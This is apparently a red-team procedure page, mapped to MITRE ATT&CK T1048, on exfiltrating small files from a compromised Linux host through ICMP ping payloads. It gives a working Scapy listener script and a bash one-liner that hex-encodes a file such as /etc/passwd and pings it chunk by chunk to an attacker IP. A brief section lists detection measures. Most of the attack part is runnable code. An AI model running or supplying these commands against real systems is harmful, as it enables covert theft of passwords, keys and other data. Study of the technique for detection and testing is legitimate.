---
type: procedure
verified: true
submitted: true
created_at: '2019-10-18T22:31:55.554401+00:00'
updated_at: '2023-05-26T00:53:56.390704+00:00'
tactics:
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
sub_techniques: []
platforms:
  - Linux
tags:
  - '[[tags/Exfiltration]]'
  - '[[tags/Network]]'
commands:
  - '[[commands/exfiltrate-file-via-ping-pattern]]'
tools: []
validated: true
---

# Exfiltrate-Data-Using-Ping

## Summary

This procedure demonstrates how to exfiltrate small files or data from a compromised Linux system using the ping command's pattern (-p) argument to encode data into ICMP echo request packets. Data is broken into 4-character (16-byte hex) chunks, sent via ping to an attacker-controlled IP, and captured using a packet sniffer on the receiving end. This technique bypasses basic network filters that may block common exfiltration protocols like HTTP or DNS while appearing as normal network diagnostics traffic.

## Description

In scenarios where a compromised host has limited outbound access or is monitored for suspicious protocols, attackers can abuse the ping utility to tunnel data out via ICMP. The -p option allows specifying a pattern to fill ICMP payloads, which can be hex-encoded file contents. On the target, the file is converted to hex using xxd, chunked, and pinged sequentially to the attacker's IP. On the attacker side, a sniffer like Scapy captures these ICMP packets and extracts the payloads. This method is stealthy for low-volume data (e.g., passwords, keys) but inefficient for large files due to packet size limits and potential rate limiting. It requires ICMP to be allowed outbound from the target and inbound to the attacker. Success depends on no deep packet inspection blocking unusual ICMP payloads.

## Requirements

1. Compromised access to a Linux target with ping and xxd utilities available (standard on most distributions).
2. Attacker machine with Python 3 and Scapy library installed, on a network reachable via ICMP from the target.
3. Network configuration allowing ICMP echo requests from target to attacker (no firewall blocks on ICMP type 8).
4. The file to exfiltrate must be small (ideally <1KB) to avoid excessive pings and detection.

## Defense

Defensive measures and detection strategies:

- Monitor ICMP traffic for unusual patterns, such as high volumes of echo requests with non-default payloads or to external IPs.
- Implement network segmentation and firewall rules to restrict outbound ICMP or limit payload sizes.
- Use intrusion detection systems (IDS) like Snort with rules for anomalous ICMP (e.g., non-empty payloads in ping).
- Enable logging of ICMP on perimeter devices and correlate with host activity for signs of data encoding.

## Objectives

1. Encode and transmit file contents from the target via ICMP without using standard exfiltration channels.
2. Capture and reconstruct the data on the attacker side for analysis or further use.
3. Maintain stealth by mimicking legitimate diagnostic traffic.
4. Verify successful transmission through packet capture and decoding.

## Instructions

### Step 1: Set Up ICMP Listener on Attacker Machine

**Context**: Deploy a packet sniffer to capture incoming ICMP echo requests and extract the 4-character payloads from each packet. This script uses Scapy to filter and decode only the relevant data, printing it in real-time as chunks arrive.

**Code** ([[codes/icmp-exfil-listener-scapy]]):

```python3
#!/usr/bin/env python3
from scapy.all import *
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <INTERFACE>")
    exit(0)
else:
    interface = sys.argv[1]
    print(f"Sniffing on {interface}")


def print_data(pkt):
    if (pkt.haslayer(ICMP)) and (pkt[ICMP].type == 8):
        data = pkt[ICMP].load[-4:].decode("utf-8")
        print(f"{data}", flush=True, end="")

sniff(iface = interface, prn=print_data)
```

> Save the script as icmp_listener.py, install Scapy if needed (pip install scapy), and run it with sudo python3 icmp_listener.py <interface> (e.g., eth0) to start listening. The script will output decoded chunks as they arrive; redirect to a file for reconstruction if needed (e.g., python3 icmp_listener.py eth0 > exfil_data.txt).

### Step 2: Encode and Exfiltrate File from Target

**Context**: On the compromised Linux host, convert the target file to hexadecimal, chunk it into 4-character segments, and send each via a single ping to the attacker's IP. This step requires replacing $FILENAME with the path to the file (e.g., /etc/passwd) and $ATTACKER_IP with the listener's IP.

**Command** ([[commands/exfiltrate-file-via-ping-pattern]]):

```bash
xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP; done
```

> This command pipes the hex-dumped file through a while loop, sending one ping per chunk. Each ping includes the hex pattern in the ICMP payload. Monitor for errors like 'ping: unknown host' if connectivity fails. The process may take time for larger files due to sequential pings.
